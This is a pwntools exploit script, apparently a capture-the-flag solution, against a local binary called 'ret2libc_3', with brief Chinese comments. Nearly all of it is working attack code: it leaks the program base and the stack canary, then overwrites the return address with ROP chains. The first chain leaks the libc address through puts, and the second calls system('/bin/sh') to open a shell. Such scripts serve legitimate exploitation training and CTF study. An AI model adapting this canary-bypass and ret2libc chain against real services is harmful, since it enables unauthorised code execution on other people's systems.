from pwn import *
context.log_level = 'debug'


#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc =  ELF('./libc-2.31.so')

elf = ELF('./ret2libc_3')

p = process('./ret2libc_3')


def debug():
	gdb.attach(p)
	pause()


'''
泄露libc -->  puts_plt(got)
puts_plt ==>  泄露elf_base
'''

p.sendlineafter(b'ch',b'1')

p.sendlineafter(b'name',b'1'*7)   # b'1'*7 + b'\n'

p.recvuntil(b'1'*7+b'\n')
process_addr = u64(p.recvn(6).ljust(8,b'\x00')) - 0x14d0
success(hex(process_addr))





p.sendlineafter(b'ch',b'2')
p.sendlineafter(b'size',b'41')
p.sendline(b'a'*40)
p.recvuntil(b'a'*40+b'\n')
canary = u64(p.recvn(7).rjust(8,b'\x00'))
success(hex(canary))


debug()

pop_rdi = process_addr + 0x0000000000001533
start = process_addr + 0x01409	#0x1160
printf_plt = process_addr + elf.plt['puts'] # 0x10d4
printf_got = process_addr + elf.got['puts'] # 0x3f90

pay = b'a'*40 + p64(canary) + p64(0) + p64(pop_rdi) + p64(printf_got) + p64(printf_plt) + p64(start)
p.sendlineafter(b'ch',b'2')
p.sendlineafter(b'size',b'100')
p.sendline(pay)

#debug()

p.sendlineafter(b'ch: ',b'3')
libcbase = u64(p.recvn(6).ljust(8,b'\x00')) - libc.symbols['puts'] # 0x84420
success(hex(libcbase))
system = libcbase + libc.symbols['system'] # 0x52290
binsh = libcbase + next(libc.search(b'/bin/sh')) # 0x1b45bd

pay = b'a'*40 + p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(system)
p.sendlineafter(b'ch',b'2')
p.sendlineafter(b'size',b'100')
p.sendline(pay)

p.sendlineafter(b'ch: ',b'3')
p.interactive()


'''
1、got  plt  --->  程序基地址相关   pie    ===》    泄漏基地址

2、canary	--->   覆盖\x00   

3、 system  --> libc  got plt

'''
